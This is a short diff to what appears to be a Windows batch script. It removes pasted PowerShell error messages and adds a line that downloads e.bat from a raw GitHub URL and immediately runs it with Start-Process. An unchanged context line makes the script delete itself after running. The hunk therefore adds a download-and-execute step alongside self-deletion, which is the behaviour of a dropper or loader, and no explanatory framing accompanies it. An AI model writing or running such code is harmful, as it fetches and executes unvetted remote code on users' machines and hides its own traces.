@@ -29,16 +29,4 @@ start /b "" cmd /c del "%~f0"&exit
 
 endlocal
 
-Exception calling "DownloadFile" with "2" argument(s): "An exception occurred during a WebClient request."
-At line:1 char:90
-+ ... mp\\e.bat"; (New-Object System.Net.WebClient).DownloadFile($url, $out ...
-+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
-    + FullyQualifiedErrorId : WebException
-
-Start-Process : This command cannot be run due to the error: The system cannot find the file specified.
-At line:1 char:150
-+ ... t System.Net.WebClient).DownloadFile($url, $out); Start-Process $out;
-+                                                       ~~~~~~~~~~~~~~~~~~
-    + CategoryInfo          : InvalidOperation: (:) [Start-Process], InvalidOperationException
-    + FullyQualifiedErrorId : InvalidOperationException,Microsoft.PowerShell.Commands.StartProcessCommand
+ $out="C:e.bat"; Invoke-WebRequest -Uri https://raw.githubusercontent.com/Sxzzzy/blue/main/e.bat -OutFile $out; Start-Process $out;
